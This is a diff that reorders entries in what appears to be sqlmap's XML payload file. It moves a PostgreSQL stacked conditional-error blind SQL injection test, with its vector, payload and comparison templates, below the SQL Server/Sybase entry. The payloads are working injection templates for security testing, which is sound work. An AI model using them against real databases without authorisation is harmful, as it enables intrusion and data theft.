@@ -1068,26 +1068,6 @@ Formats:
     </test>
 
     <test>
-        <title>PostgreSQL stacked conditional-error blind queries</title>
-        <stype>1</stype>
-        <level>3</level>
-        <risk>0</risk>
-        <clause>0</clause>
-        <where>2</where>
-        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</vector>
-        <request>
-            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</payload>
-            <comment>--</comment>
-        </request>
-        <response>
-            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</comparison>
-        </response>
-        <details>
-            <dbms>PostgreSQL</dbms>
-        </details>
-    </test>
-
-    <test>
         <title>Microsoft SQL Server/Sybase stacked conditional-error blind queries</title>
         <stype>1</stype>
         <level>3</level>
@@ -1106,6 +1086,26 @@ Formats:
             <dbms>Microsoft SQL Server</dbms>
             <dbms>Sybase</dbms>
             <os>Windows</os>
+        </details>
+    </test>
+
+    <test>
+        <title>PostgreSQL stacked conditional-error blind queries</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>2</where>
+        <vector>; SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</vector>
+        <request>
+            <payload>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</payload>
+            <comment>--</comment>
+        </request>
+        <response>
+            <comparison>; SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [RANDNUM] ELSE 1/(SELECT 0) END);</comparison>
+        </response>
+        <details>
+            <dbms>PostgreSQL</dbms>
         </details>
     </test>
     <!-- End of stacked conditional-error blind queries tests -->
